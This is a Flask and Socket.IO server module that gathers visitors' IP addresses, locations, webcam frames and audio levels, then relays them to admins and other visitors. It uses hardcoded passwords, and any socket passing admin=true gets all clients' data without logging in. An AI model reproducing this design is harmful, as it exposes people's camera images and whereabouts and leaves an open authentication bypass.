from flask import Blueprint, render_template, request, session, redirect, url_for
from flask_socketio import emit
import base64
from main import socketio

bp = Blueprint('random_route', __name__, url_prefix='/random')

ADMIN_PASSWORD = 'admin123'
CLEAR_PASSWORD = 'arif123'

clients = {}        # key = IP, value = {id, ip, ua, location, frame, audio, sids, offline}
admin_sids = set()

@bp.route('/')
def index():
    return render_template('random_index.html')

@bp.route('/admin')
def admin():
    if not session.get('admin_logged_in'):
        return redirect(url_for('random_route.admin_login'))
    return render_template('random_admin.html')

@bp.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            return redirect(url_for('random_route.admin'))
        return render_template('random_admin_login.html', error='Wrong password')
    return render_template('random_admin_login.html')

@bp.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('random_route.admin'))

# ========== Socket.IO ==========
@socketio.on('connect')
def handle_connect():
    is_admin = request.args.get('admin', 'false').lower() == 'true'
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('User-Agent')
    
    if not is_admin:
        if ip not in clients:
            clients[ip] = {
                'id': ip,
                'ip': ip,
                'user_agent': ua,
                'location': None,
                'last_frame': None,
                'audio_level': 0,
                'sids': [request.sid],
                'offline': False
            }
        else:
            if request.sid not in clients[ip]['sids']:
                clients[ip]['sids'].append(request.sid)
            clients[ip]['offline'] = False
            # ইউজার-এজেন্ট আপডেট করো (যদি পরিবর্তন হয়)
            clients[ip]['user_agent'] = ua
        # ইউজারদের কাছে অন্য ইউজারদের ডেটা পাঠাও (নিজের বাদ)
        emit_public_update()
        print(f"✅ User connected: {ip}")
    else:
        admin_sids.add(request.sid)
        emit('admin_update', clients, to=request.sid)
        print(f"🛡️ Admin connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    for ip, data in list(clients.items()):
        if request.sid in data['sids']:
            data['sids'].remove(request.sid)
            if not data['sids']:
                data['offline'] = True
                print(f"📴 User {ip} went offline")
            break
    if request.sid in admin_sids:
        admin_sids.remove(request.sid)
    
    # ইউজারদের আপডেট পাঠাও (নিজের বাদ)
    emit_public_update()
    # এডমিনদের আপডেট পাঠাও (সব ডেটা)
    if admin_sids:
        emit('admin_update', clients, to=list(admin_sids))
    print(f"📴 Disconnect, active clients: {len(clients)}")

@socketio.on('ready')
def handle_ready():
    # ইউজার পারমিশন দিলে কিছু না
    pass

@socketio.on('location_update')
def handle_location(data):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    if ip in clients:
        clients[ip]['location'] = data
        clients[ip]['offline'] = False
        emit_public_update()
        if admin_sids:
            emit('admin_update', clients, to=list(admin_sids))
        print(f"📍 Location update from {ip}")

@socketio.on('video_frame')
def handle_video(data):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    if ip in clients:
        clients[ip]['last_frame'] = data.get('image')
        clients[ip]['audio_level'] = data.get('audio_volume', 0)
        clients[ip]['offline'] = False
        emit_public_update()
        if admin_sids:
            emit('admin_update', clients, to=list(admin_sids))
        if not hasattr(handle_video, 'counter'):
            handle_video.counter = 0
        handle_video.counter += 1
        if handle_video.counter % 10 == 0:
            print(f"🎥 Video frame from {ip}, audio: {data.get('audio_volume',0)}%")

# ========== পাবলিক ইউজারদের জন্য আপডেট (নিজের বাদ + অফলাইন বাদ + কাউন্ট) ==========
def emit_public_update():
    # অনলাইন ইউজারদের তালিকা (offline=False যাদের)
    online_clients = {ip: data for ip, data in clients.items() if not data['offline']}
    offline_count = sum(1 for data in clients.values() if data['offline'])
    online_count = len(online_clients)
    
    # প্রতিটি ইউজারকে পাঠানোর জন্য ফিল্টার
    for ip, data in clients.items():
        if data['offline']:
            continue   # অফলাইন ইউজারদের কাছে কিছু পাঠাবো না
        # নিজের IP বাদ দিয়ে বাকি online ইউজারদের ডেটা
        filtered = {other_ip: other_data for other_ip, other_data in online_clients.items() if other_ip != ip}
        # সকেট আইডিগুলোতে পাঠাও
        for sid in data['sids']:
            emit('public_update', {
                'clients': filtered,
                'online_count': online_count,
                'offline_count': offline_count
            }, to=sid)

# ========== ক্লিয়ার ==========
@socketio.on('clear_data')
def handle_clear(data):
    password = data.get('password')
    if password == CLEAR_PASSWORD:
        clients.clear()
        emit('clear_all', broadcast=True)
        if admin_sids:
            emit('admin_update', clients, to=list(admin_sids))
        print("🗑️ All data cleared")
        return {'status': 'ok'}
    else:
        return {'status': 'error', 'message': 'Wrong password'}
